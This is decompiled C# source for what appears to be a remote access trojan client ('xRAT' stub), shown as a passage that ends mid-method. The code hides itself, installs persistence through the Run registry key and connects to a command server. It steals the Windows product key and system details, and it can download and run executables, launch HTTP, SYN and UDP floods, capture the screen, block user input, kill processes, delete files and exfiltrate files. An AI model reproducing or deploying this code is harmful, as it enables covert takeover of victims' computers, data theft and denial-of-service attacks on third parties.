using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

[StandardModule]
internal sealed class Class5
{
	private static string string_0 = "127.0.0.1";

	private static int int_0 = 40000;

	private static string string_1 = "153842422733";

	private static string string_2 = "1.0";

	private static string string_3 = "stub.exe";

	private static string string_4 = "stub";

	private static string string_5 = "";

	private static string string_6 = "";

	private static int int_1 = 0;

	private static string string_7 = "Idle...";

	private static Mutex mutex_0;

	private static Thread thread_0 = new Thread(smethod_29);

	private static Thread thread_1 = new Thread(smethod_9);

	private static int int_2 = 0;

	private static bool bool_0 = false;

	private static Thread thread_2;

	private static TcpClient tcpClient_0;

	private const uint uint_0 = 1024u;

	private const uint uint_1 = 4098u;

	private const int int_3 = 7;

	private const int int_4 = 1;

	private const int int_5 = 0;

	private static Chat chat_0 = new Chat();

	private static GClass0 gclass0_0;

	private static long long_0 = 10L;

	public static List<TcpClient> list_0 = new List<TcpClient>();

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int BlockInput(int int_6);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetConsoleWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int ShowWindow(IntPtr intptr_0, int int_6);

	[DllImport("kernel32.dll")]
	private static extern int GetLocaleInfo(uint uint_2, uint uint_3, [Out] StringBuilder stringBuilder_0, int int_6);

	[MethodImpl(MethodImplOptions.NoOptimization)]
	[STAThread]
	public static void Main()
	{
		try
		{
			ShowWindow(GetConsoleWindow(), 0);
			string text = "";
			string text2 = smethod_22("xRAT11", Encoding.Default.GetString(Class8.smethod_0(Application.get_ExecutablePath())));
			string[] array = Strings.Split(text2, "|//\\\\|", -1, (CompareMethod)0);
			string_6 = smethod_22("KeY11", array[7]);
			text = smethod_22("KeY11", array[8]);
			string text3 = text;
			if (Operators.CompareString(text3, Conversions.ToString(1), false) == 0)
			{
				string text4 = string_6;
				if (Operators.CompareString(text4, "0", false) == 0)
				{
					string_5 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
				}
				else
				{
					string_5 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + string_6;
				}
			}
			else if (Operators.CompareString(text3, Conversions.ToString(2), false) == 0)
			{
				string text5 = string_6;
				if (Operators.CompareString(text5, "0", false) == 0)
				{
					string_5 = Environment.GetFolderPath(Environment.SpecialFolder.System);
				}
				else
				{
					string_5 = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\" + string_6;
				}
			}
			else if (Operators.CompareString(text3, Conversions.ToString(3), false) == 0)
			{
				string text6 = string_6;
				if (Operators.CompareString(text6, "0", false) == 0)
				{
					string_5 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
				}
				else
				{
					string_5 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\" + string_6;
				}
			}
			if (Operators.CompareString(Application.get_StartupPath(), string_5, false) == 0)
			{
				string text7 = smethod_22("xRAT11", Encoding.Default.GetString(Class8.smethod_0(Application.get_ExecutablePath())));
				string name = default(string);
				if (text7.Contains("|//\\\\|"))
				{
					string[] array2 = Strings.Split(text7, "|//\\\\|", -1, (CompareMethod)0);
					string_0 = smethod_22("KeY11", array2[1]);
					int_0 = Conversions.ToInteger(smethod_22("KeY11", array2[2]));
					string_1 = array2[3];
					string_2 = smethod_22("KeY11", array2[4]);
					string_3 = smethod_22("KeY11", array2[5]);
					string_4 = smethod_22("KeY11", array2[6]);
					int_1 = Conversions.ToInteger(smethod_22("KeY11", array2[9]));
					name = smethod_22("KeY11", array2[10]);
				}
				mutex_0 = new Mutex(initiallyOwned: false, name, out var createdNew);
				if (!createdNew)
				{
					ProjectData.EndApp();
				}
				if (int_1 == 1)
				{
					Thread thread = new Thread(smethod_0);
					thread.IsBackground = true;
					thread.Start();
				}
				thread_0.Start();
				smethod_1();
			}
			else
			{
				string text8 = smethod_22("xRAT11", Encoding.Default.GetString(Class8.smethod_0(Application.get_ExecutablePath())));
				if (text8.Contains("|//\\\\|"))
				{
					string[] array3 = Strings.Split(text8, "|//\\\\|", -1, (CompareMethod)0);
					string_0 = smethod_22("KeY11", array3[1]);
					int_0 = Conversions.ToInteger(smethod_22("KeY11", array3[2]));
					string_1 = array3[3];
					string_2 = smethod_22("KeY11", array3[4]);
					string_3 = smethod_22("KeY11", array3[5]);
					string_4 = smethod_22("KeY11", array3[6]);
					int_1 = Conversions.ToInteger(smethod_22("KeY11", array3[9]));
				}
				if (!Directory.Exists(string_5))
				{
					Directory.CreateDirectory(string_5);
				}
				if (!File.Exists(string_5 + "\\" + string_3))
				{
					File.Copy(Application.get_ExecutablePath(), string_5 + "\\" + string_3, overwrite: true);
					smethod_18(string_4, string_5 + "\\" + string_3);
					Process process = new Process();
					process.StartInfo.CreateNoWindow = true;
					process.StartInfo.UseShellExecute = false;
					process.StartInfo.FileName = string_5 + "\\" + string_3;
					process.Start();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_0()
	{
		while (true)
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: false);
			if (Operators.ConditionalCompareObjectEqual(registryKey.GetValue(string_4), (object)0, false))
			{
				smethod_18(string_4, string_5 + "\\" + string_3);
			}
			Thread.Sleep(2000);
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void smethod_1()
	{
		checked
		{
			try
			{
				if (int_2 == 40)
				{
					Process process = new Process();
					process.StartInfo.CreateNoWindow = true;
					process.StartInfo.UseShellExecute = false;
					process.StartInfo.FileName = string_5 + "\\" + string_3;
					process.Start();
					thread_0.Abort();
					ProjectData.EndApp();
				}
				tcpClient_0 = new TcpClient(string_0, int_0);
				smethod_4(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(string.Concat(string.Concat(string.Concat(string.Concat(string.Concat(string.Concat("CONNECTED|" + string_2, "|"), string_7), "|"), WindowsIdentity.GetCurrent().Name), "|"), smethod_14(smethod_13())), "|"), smethod_23()), (object)"|"), (object)smethod_17()), (object)"|"), (object)string_1)));
				tcpClient_0.GetStream().BeginRead(new byte[1] { 0 }, 0, 0, smethod_2, null);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				int_2++;
				Thread.Sleep(4000);
				smethod_1();
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void smethod_2(IAsyncResult iasyncResult_0)
	{
		try
		{
			StreamReader streamReader = new StreamReader(tcpClient_0.GetStream());
			string text = streamReader.ReadLine();
			text = Conversions.ToString(Class4.smethod_1("KeYaEs11", text));
			smethod_3(text);
			tcpClient_0.GetStream().BeginRead(new byte[1] { 0 }, 0, 0, smethod_2, null);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Thread.Sleep(4000);
			smethod_1();
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_3(string string_8)
	{
		//IL_0351: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string[] array = string_8.Split(new char[1] { '|' });
			switch (array[0])
			{
			case "SYSINFO":
			{
				string string_9 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"SYSINFO|", smethod_23()), (object)"|"), smethod_24()), (object)"|"), smethod_25()), (object)"|"), smethod_26()), (object)"|"), smethod_27()), (object)"|"), smethod_28()), (object)"|"), (object)smethod_8()));
				smethod_4(string_9);
				break;
			}
			case "DL":
				try
				{
					WebClient webClient = new WebClient();
					string fileName = Path.GetTempFileName() + ".exe";
					smethod_6("Downloading File...");
					webClient.DownloadFile(array[1], fileName);
					smethod_6("Downloaded File!");
					Process.Start(fileName);
					smethod_6("File Executed!");
					break;
				}
				catch (Exception projectError9)
				{
					ProjectData.SetProjectError(projectError9);
					smethod_6("Error Downloading File...");
					ProjectData.ClearProjectError();
					break;
				}
			case "HTTPSTART":
				try
				{
					bool_0 = true;
					thread_2 = new Thread(delegate(object object_0)
					{
						smethod_15((object[])object_0);
					});
					thread_2.IsBackground = true;
					thread_2.Start(new object[1] { array[1] });
					smethod_6("HTTP-Flooding...");
					break;
				}
				catch (Exception projectError10)
				{
					ProjectData.SetProjectError(projectError10);
					smethod_6("Error HTTP-Flood...");
					ProjectData.ClearProjectError();
					break;
				}
			case "HTTPSTOP":
				try
				{
					smethod_6("Stopping SYN-Flood...");
					bool_0 = false;
					foreach (TcpClient item in list_0)
					{
						try
						{
							item.GetStream().Dispose();
						}
						catch (Exception projectError5)
						{
							ProjectData.SetProjectError(projectError5);
							ProjectData.ClearProjectError();
						}
					}
					thread_2.Abort();
					smethod_6("Idle...");
					break;
				}
				catch (Exception projectError6)
				{
					ProjectData.SetProjectError(projectError6);
					smethod_6("Error Stop HTTP-Flood...");
					ProjectData.ClearProjectError();
					break;
				}
			case "SYNSTART":
				try
				{
					Class9.string_0 = array[1];
					Class9.int_0 = Conversions.ToInteger(array[2]);
					Class9.int_2 = 20;
					Class9.int_1 = 10;
					Class9.smethod_0();
					smethod_6("SYN-Flooding...");
					break;
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					smethod_6("Error SYN-Flood...");
					ProjectData.ClearProjectError();
					break;
				}
			case "SYNSTOP":
				try
				{
					smethod_6("Stopping SYN-Flood...");
					Class9.smethod_1();
					smethod_6("Idle...");
					break;
				}
				catch (Exception projectError20)
				{
					ProjectData.SetProjectError(projectError20);
					smethod_6("Error Stop SYN-Flood...");
					ProjectData.ClearProjectError();
					break;
				}
			case "CHNGRMTDESKQUALITY":
				long_0 = Conversions.ToLong(array[1]);
				break;
			case "REMOTEDESK":
				try
				{
					smethod_5();
					break;
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)0, (object)null);
					smethod_6("Error View Remote Desktop...");
					ProjectData.ClearProjectError();
					break;
				}
			case "PRCLIST":
				try
				{
					string text4 = "PRCLIST|";
					Process[] processes = Process.GetProcesses();
					foreach (Process process2 in processes)
					{
						text4 = text4 + process2.ProcessName + ".exe|";
					}
					smethod_4(text4);
					break;
				}
				catch (Exception projectError19)
				{
					ProjectData.SetProjectError(projectError19);
					ProjectData.ClearProjectError();
					break;
				}
			case "APIENABLE":
				try
				{
					smethod_6("Enabling Keyboard And Mouse...");
					BlockInput(0);
					smethod_6("Enabled Keyboard And Mouse!");
					break;
				}
				catch (Exception projectError18)
				{
					ProjectData.SetProjectError(projectError18);
					smethod_6("Error Enable Keyboard And Mouse...");
					ProjectData.ClearProjectError();
					break;
				}
			case "APIDISABLE":
				try
				{
					smethod_6("Disabling Keyboard And Mouse...");
					BlockInput(1);
					smethod_6("Disabled Keyboard And Mouse!");
					break;
				}
				catch (Exception projectError17)
				{
					ProjectData.SetProjectError(projectError17);
					smethod_6("Error Disable Keyboard And Mouse...");
					ProjectData.ClearProjectError();
					break;
				}
			case "SHUTDOWN":
				try
				{
					smethod_6("PC Shutting Down...");
					Process.Start("ShutDown", "/t 05");
					smethod_6("PC Shutdowned!");
					break;
				}
				catch (Exception projectError16)
				{
					ProjectData.SetProjectError(projectError16);
					smethod_6("Error PC Shutdown...");
					ProjectData.ClearProjectError();
					break;
				}
			case "RESTART":
				try
				{
					smethod_6("PC Restarting...");
					Process.Start("ShutDown", "/r");
					smethod_6("PC Restarted!");
					break;
				}
				catch (Exception projectError15)
				{
					ProjectData.SetProjectError(projectError15);
					smethod_6("Error PC Restart...");
					ProjectData.ClearProjectError();
					break;
				}
			case "URL":
				try
				{
					smethod_6("Opening Website...");
					Process.Start(array[1]);
					smethod_6("Website opened!");
					break;
				}
				catch (Exception projectError14)
				{
					ProjectData.SetProjectError(projectError14);
					smethod_6("Error Opening Website...");
					ProjectData.ClearProjectError();
					break;
				}
			case "MSGBOX":
				try
				{
					smethod_12(array[1], array[2], Conversions.ToInteger(array[3]), Conversions.ToInteger(array[4]));
					smethod_6("MessageBox showed!");
					break;
				}
				catch (Exception projectError13)
				{
					ProjectData.SetProjectError(projectError13);
					smethod_6("Error Show MessageBox...");
					ProjectData.ClearProjectError();
					break;
				}
			case "PRCSTART":
				try
				{
					smethod_6("Starting Process...");
					Process.Start(array[1]);
					smethod_6("Started Process!");
					break;
				}
				catch (Exception projectError12)
				{
					ProjectData.SetProjectError(projectError12);
					smethod_6("Error Start Process...");
					ProjectData.ClearProjectError();
					break;
				}
			case "PRCKILL":
				try
				{
					smethod_6("Killing Process...");
					Process[] processesByName = Process.GetProcessesByName(array[1]);
					Process[] array3 = processesByName;
					foreach (Process process in array3)
					{
						process.Kill();
					}
					smethod_6("Killed " + array[1] + ".exe!");
					break;
				}
				catch (Exception projectError11)
				{
					ProjectData.SetProjectError(projectError11);
					smethod_6("Error Kill Process...");
					ProjectData.ClearProjectError();
					break;
				}
			case "CHAT":
				if (!thread_1.IsAlive)
				{
					thread_1.Start();
				}
				else
				{
					((Control)chat_0).Show();
				}
				Thread.Sleep(200);
				chat_0.method_1(array[1], array[2]);
				break;
			case "UDPSTART":
				try
				{
					gclass0_0 = new GClass0(array[1], array[2], 15);
					gclass0_0.method_0();
					smethod_6("UDP-Flooding...");
					break;
				}
				catch (Exception projectError8)
				{
					ProjectData.SetProjectError(projectError8);
					smethod_6("Error UDP-Flooding...");
					ProjectData.ClearProjectError();
					break;
				}
			case "UDPSTOP":
				try
				{
					smethod_6("Stopping UDP-Flood...");
					if (Operators.ConditionalCompareObjectEqual(gclass0_0.Object_0, (object)true, false))
					{
						gclass0_0.method_2();
					}
					smethod_6("Idle...");
					break;
				}
				catch (Exception projectError7)
				{
					ProjectData.SetProjectError(projectError7);
					smethod_6("Error UDP-Flood...");
					ProjectData.ClearProjectError();
					break;
				}
			case "GETDRIVES":
			{
				string text2 = "";
				string[] logicalDrives = Environment.GetLogicalDrives();
				foreach (string text3 in logicalDrives)
				{
					text2 = text2 + text3 + ">";
				}
				smethod_4("DRIVES|" + text2);
				break;
			}
			case "DIR":
				smethod_11(array[1]);
				break;
			case "READDIR":
				smethod_10(array[1]);
				break;
			case "DEL":
				try
				{
					string text = array[2];
					if (Operators.CompareString(text, "Folder", false) == 0)
					{
						Directory.Delete(array[1], recursive: true);
						smethod_7("Directory Deleted!");
					}
					else if (Operators.CompareString(text, "File", false) == 0)
					{
						File.Delete(array[1]);
						smethod_7("File Deleted!");
					}
					break;
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					smethod_7("Access denied!");
					ProjectData.ClearProjectError();
					break;
				}
			case "DOWNLOADFILE":
				try
				{
					smethod_7("Downloading File...");
					Thread.Sleep(50);
					byte[] inArray = File.ReadAllBytes(array[1]);
					string[] array2 = array[1].Split(new char[1] { '\\' });
					smethod_4("SENDFILE|" + Convert.ToBase64String(inArray) + "|" + array2[checked(array2.Length - 1)]);
					break;
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					smethod_7("Access denied!");
					ProjectData.ClearProjectError();
					break;
				}
			case "UPLOADFILE":
				try
				{
					byte[] bytes = Convert.FromBase64String(array[1]);
					File.WriteAllBytes(array[3] + "\\" + array[2], bytes);
					smethod_7("File uploaded and saved!");
					break;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					smethod_7("Access denied!");
					ProjectData.ClearProjectError();
					break;
				}
			}
		}
		catch (Exception projectError21)
		{
			ProjectData.SetProjectError(projectError21);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_4(string string_8)
	{
		try
		{
			StreamWriter streamWriter = new StreamWriter(tcpClient_0.GetStream());
			string_8 = Conversions.ToString(Class4.smethod_0("KeYaEs11", string_8));
			streamWriter.WriteLine(string_8);
			streamWriter.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_5()
	{
		try
		{
			if (File.Exists(Path.GetTempPath() + "\\scr.jpg"))
			{
				File.Delete(Path.GetTempPath() + "\\scr.jpg");
			}
			smethod_20(smethod_19(), Path.GetTempPath() + "\\scr.jpg", long_0);
			StreamWriter streamWriter = new StreamWriter(tcpClient_0.GetStream());
			byte[] inArray = File.ReadAllBytes(Path.GetTempPath() + "\\scr.jpg");
			string text = Convert.ToBase64String(inArray);
			string value = "REMOTEDESK|" + text;
			streamWriter.WriteLine(value);
			streamWriter.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_6(string string_8)
	{
		string_7 = string_8;
		try
		{
			StreamWriter streamWriter = new StreamWriter(tcpClient_0.GetStream());
			string_8 = Conversions.ToString(Class4.smethod_0("KeYaEs11", "STATUS|" + string_8));
			streamWriter.WriteLine(string_8);
			streamWriter.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_7(string string_8)
	{
		try
		{
			StreamWriter streamWriter = new StreamWriter(tcpClient_0.GetStream());
			string_8 = Conversions.ToString(Class4.smethod_0("KeYaEs11", "STATUSFM|" + string_8));
			streamWriter.WriteLine(string_8);
			streamWriter.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static bool smethod_8()
	{
		WindowsIdentity current = WindowsIdentity.GetCurrent();
		WindowsPrincipal windowsPrincipal = new WindowsPrincipal(current);
		return windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
	}

	public static void smethod_9()
	{
		Application.Run((Form)(object)chat_0);
	}

	public static void smethod_10(string string_8)
	{
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(string_8);
			FileInfo[] files = directoryInfo.GetFiles();
			string text = null;
			string text2 = null;
			string[] directories = Directory.GetDirectories(string_8);
			foreach (string text3 in directories)
			{
				text = text + text3 + "<";
			}
			FileInfo[] array = files;
			foreach (FileInfo fileInfo in array)
			{
				text2 = text2 + fileInfo.ToString() + ":" + Conversions.ToString(fileInfo.Length) + "<";
			}
			smethod_4("DIR|" + text + "|" + text2 + "|" + string_8);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			smethod_4("DIR|Access denied!|");
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_11(string string_8)
	{
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(string_8 + ":\\");
			FileInfo[] files = directoryInfo.GetFiles();
			string text = null;
			string text2 = null;
			string[] directories = Directory.GetDirectories(string_8 + ":\\");
			foreach (string text3 in directories)
			{
				text = text + text3 + "<";
			}
			FileInfo[] array = files;
			foreach (FileInfo fileInfo in array)
			{
				text2 = text2 + fileInfo.ToString() + ":" + Conversions.ToString(fileInfo.Length) + "<";
			}
			smethod_4("DIR|" + text + "|" + text2 + "|" + string_8 + ":\\");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			smethod_4("DIR|Access denied!|");
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_12(string string_8, string string_9, int int_6, int int_7)
	{
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Unknown result type (might be due to invalid IL or missing references)
		//IL_005c: Unknown result type (might be due to invalid IL or missing references)
		//IL_006b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0097: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0105: Unknown result type (might be due to invalid IL or missing references)
		//IL_0111: Unknown result type (might be due to invalid IL or missing references)
		//IL_0137: Unknown result type (might be due to invalid IL or missing references)
		//IL_0143: Unknown result type (might be due to invalid IL or missing references)
		//IL_014f: Unknown result type (might be due to invalid IL or missing references)
		//IL_015b: Unknown result type (might be due to invalid IL or missing references)
		switch (int_6)
		{
		case 1:
			switch (int_7)
			{
			case 1:
				Interaction.MsgBox((object)string_8, (MsgBoxStyle)64, (object)string_9);
				break;
			case 2:
				Interaction.MsgBox((object)string_8, (MsgBoxStyle)65, (object)string_9);
				break;
			case 3:
				Interaction.MsgBox((object)string_8, (MsgBoxStyle)68, (object)string_9);
				break;
			case 4:
				Interaction.MsgBox((object)string_8, (MsgBoxStyle)66, (object)string_9);
				break;
			}
			break;
		case 2:
			switch (int_7)
			{
			case 1:
				Interaction.MsgBox((object)string_8, (MsgBoxStyle)16, (object)string_9);
				break;
			case 2:
				Interaction.MsgBox((object)string_8, (MsgBoxStyle)17, (object)string_9);
				break;
			case 3:
				Interaction.MsgBox((object)string_8, (MsgBoxStyle)20, (object)string_9);
				break;
			case 4:
				Interaction.MsgBox((object)string_8, (MsgBoxStyle)18, (object)string_9);
				break;
			}
			break;
		case 3:
			switch (int_7)
			{
			case 1:
				Interaction.MsgBox((object)string_8, (MsgBoxStyle)48, (object)string_9);
				break;
			case 2:
				Interaction.MsgBox((object)string_8, (MsgBoxStyle)49, (object)string_9);
				break;
			case 3:
				Interaction.MsgBox((object)string_8, (MsgBoxStyle)52, (object)string_9);
				break;
			case 4:
				Interaction.MsgBox((object)string_8, (MsgBoxStyle)50, (object)string_9);
				break;
			}
			break;
		case 4:
			switch (int_7)
			{
			case 1:
				Interaction.MsgBox((object)string_8, (MsgBoxStyle)32, (object)string_9);
				break;
			case 2:
				Interaction.MsgBox((object)string_8, (MsgBoxStyle)33, (object)string_9);
				break;
			case 3:
				Interaction.MsgBox((object)string_8, (MsgBoxStyle)36, (object)string_9);
				break;
			case 4:
				Interaction.MsgBox((object)string_8, (MsgBoxStyle)34, (object)string_9);
				break;
			}
			break;
		}
	}

	public static byte[] smethod_13()
	{
		byte[] result = null;
		RegistryKey registryKey = null;
		registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", writable: false);
		if (registryKey != null)
		{
			result = registryKey.GetValue("DigitalProductId") as byte[];
			registryKey.Close();
		}
		return result;
	}

	public static string smethod_14(byte[] byte_0)
	{
		char[] array = new char[24]
		{
			'B', 'C', 'D', 'F', 'G', 'H', 'J', 'K', 'M', 'P',
			'Q', 'R', 'T', 'V', 'W', 'X', 'Y', '2', '3', '4',
			'6', '7', '8', '9'
		};
		char[] array2 = new char[29];
		ArrayList arrayList = new ArrayList();
		int num = 52;
		checked
		{
			do
			{
				arrayList.Add(byte_0[num]);
				num++;
			}
			while (num <= 67);
			int num2 = 28;
			do
			{
				if (unchecked(checked(num2 + 1) % 6) != 0)
				{
					int num3 = 0;
					int num4 = 14;
					do
					{
						int num5 = (num3 << 8) | Conversions.ToByte(arrayList[num4]);
						arrayList[num4] = (byte)unchecked(num5 / 24);
						num3 = unchecked(num5 % 24);
						array2[num2] = array[num3];
						num4 += -1;
					}
					while (num4 >= 0);
				}
				else
				{
					array2[num2] = '-';
				}
				num2 += -1;
			}
			while (num2 >= 0);
			return new string(array2);
		}
	}

	public static void smethod_15(object[] object_0)
	{
		while (bool_0)
		{
			TcpClient tcpClient = new TcpClient();
			list_0.Add(tcpClient);
			try
			{
				object[] array = new object[2];
				int num = 0;
				array[0] = RuntimeHelpers.GetObjectValue(object_0[0]);
				array[1] = 80;
				object[] array2 = array;
				bool[] array3 = new bool[2] { true, false };
				NewLateBinding.LateCall((object)tcpClient, (Type)null, "Connect", array2, (string[])null, (Type[])null, array3, true);
				if (array3[0])
				{
					object_0[num] = RuntimeHelpers.GetObjectValue(array2[0]);
				}
				StreamWriter streamWriter = new StreamWriter(tcpClient.GetStream());
				streamWriter.Write(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"POST / HTTP/1.1\r\n", Operators.AddObject(Operators.AddObject((object)"Host: ", object_0[0]), (object)"\r")), (object)"\n"), (object)"Content-length: 5235"), (object)"\r"), (object)"\n"), (object)"\r"), (object)"\n"));
				streamWriter.Flush();
				Thread.Sleep(50);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private static string smethod_16(uint uint_2)
	{
		StringBuilder stringBuilder = new StringBuilder(256);
		int localeInfo = GetLocaleInfo(1024u, uint_2, stringBuilder, stringBuilder.Capacity);
		if (localeInfo > 0)
		{
			return stringBuilder.ToString().Substring(0, checked(localeInfo - 1));
		}
		return string.Empty;
	}

	public static string smethod_17()
	{
		return smethod_16(4098u);
	}

	private static void smethod_18(string string_8, string string_9)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue(string_8, string_9);
			registryKey.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static Image smethod_19()
	{
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Expected O, but got Unknown
		Rectangle rectangle = default(Rectangle);
		Bitmap val = null;
		Graphics val2 = null;
		rectangle = Screen.get_PrimaryScreen().get_Bounds();
		val = new Bitmap(rectangle.Width, rectangle.Height, (PixelFormat)2498570);
		val2 = Graphics.FromImage((Image)(object)val);
		val2.CopyFromScreen(rectangle.X, rectangle.Y, 0, 0, rectangle.Size, (CopyPixelOperation)13369376);
		return (Image)(object)val;
	}

	private static void smethod_20(Image image_0, string string_8, long long_1)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Expected O, but got Unknown
		EncoderParameters val = new EncoderParameters(1);
		val.get_Param()[0] = new EncoderParameter(Encoder.Quality, long_1);
		image_0.Save(string_8, smethod_21("image/jpeg"), val);
	}

	private static ImageCodecInfo smethod_21(string string_8)
	{
		ImageCodecInfo[] imageEncoders = ImageCodecInfo.GetImageEncoders();
		int num = 0;
		ImageCodecInfo val;
		while (true)
		{
			if (num < imageEncoders.Length)
			{
				val = imageEncoders[num];
				if (Operators.CompareString(val.get_MimeType(), string_8, false) == 0)
				{
					break;
				}
				num = checked(num + 1);
				continue;
			}
			throw new ArgumentOutOfRangeException($"'{string_8}' not supported");
		}
		return val;
	}

	public static string smethod_22(string string_8, string string_9)
	{
		string text = null;
		checked
		{
			long num = (long)Math.Round((double)Strings.Len(string_9) / 2.0);
			for (long num2 = 1L; num2 <= num; num2++)
			{
				int num3 = (int)Math.Round(Conversion.Val("&H" + Strings.Mid(string_9, (int)(2L * num2 - 1L), 2)));
				int num4 = Strings.Asc(Strings.Mid(string_8, (int)(unchecked(num2 % Strings.Len(string_8)) + 1L), 1));
				text += Conversions.ToString(Strings.Chr(num3 ^ num4));
			}
			return text;
		}
	}

	public static object smethod_23()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected O, but got Unknown
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0073: Unknown result type (might be due to invalid IL or missing references)
		//IL_007a: Expected O, but got Unknown
		//IL_0091: Unknown result type (might be due to invalid IL or missing references)
		//IL_0098: Expected O, but got Unknown
		//IL_00f2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f9: Expected O, but got Unknown
		string text = null;
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_OperatingSystem");
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = val.Get().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					text = Conversions.ToString(Operators.ConcatenateObject((object)text, ((ManagementBaseObject)val2).get_Item("Caption")));
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			text = "error";
			ProjectData.ClearProjectError();
		}
		try
		{
			ManagementObjectSearcher val3 = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_OperatingSystem");
			ManagementObjectEnumerator enumerator2 = default(ManagementObjectEnumerator);
			try
			{
				enumerator2 = val3.Get().GetEnumerator();
				while (enumerator2.MoveNext())
				{
					ManagementObject val4 = (ManagementObject)enumerator2.get_Current();
					text = Conversions.ToString(Operators.ConcatenateObject((object)text, Operators.ConcatenateObject((object)" ", ((ManagementBaseObject)val4).get_Item("OSArchitecture"))));
				}
			}
			finally
			{
				((IDisposable)enumerator2)?.Dispose();
			}
		}
